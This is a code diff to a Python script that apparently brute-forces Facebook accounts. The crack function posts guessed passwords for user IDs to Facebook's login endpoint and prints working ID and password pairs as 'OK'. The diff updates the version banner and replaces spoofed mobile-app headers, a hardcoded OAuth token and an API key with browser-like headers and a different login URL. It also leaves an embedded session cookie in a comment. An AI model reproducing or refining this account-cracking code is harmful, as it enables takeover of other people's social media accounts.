@@ -47,7 +47,7 @@ logo= f'''  _   _              _ ______ ______ ____
  \033[1;97m[\033[1;92m•\033[1;97m] Author   : HAJI NAJEEB
  \033[1;97m[\033[1;92m•\033[1;97m] Facebook : HAJINAJEEB
  \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : HAJI
- \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.1
+ \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.2
 \033[1;97m---------------------------------------------------
 '''
 
@@ -165,29 +165,29 @@ def crack(uid, pww, total_idz):
                 "method": "auth.login",
                 "fb_api_req_friendly_name": "authenticate",
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
+                "api_key": "882a8490361da98702bf97a021ddc14d",}
             headers = {
-                "User-Agent": ua,
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-                "X-FB-Connection-Type": sex,
-                "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
-                "X-FB-Connection-Quality": sex,
-                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            }
-            url = "https://b-graph.facebook.com/auth/login"
+            'authority': 'm.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+          # 'cookie': 'ps_l=0; ps_n=0; datr=Tkq_ZRw3BJguMNjqepyZjc5V; sb=Tkq_ZbNgJMfXBImLKn5MpC12; m_pixel_ratio=1.891728162765503; wd=572x1159; fr=0qnsd5IwKprxlu5EF..Blv0pO.zg.AAA.0.0.Blv0pV.AWWZooMe_y0',
+            'dpr': '2.2250001430511475',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"SOV43"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            url = "https://m.facebook.com/auth/login"
             po = requests.post(url, data=data, headers=headers).json()
             if "session_key" in po:
                 print(f"\r\033[1;92m [HAJI_1-OK] {uid} | {pw}")
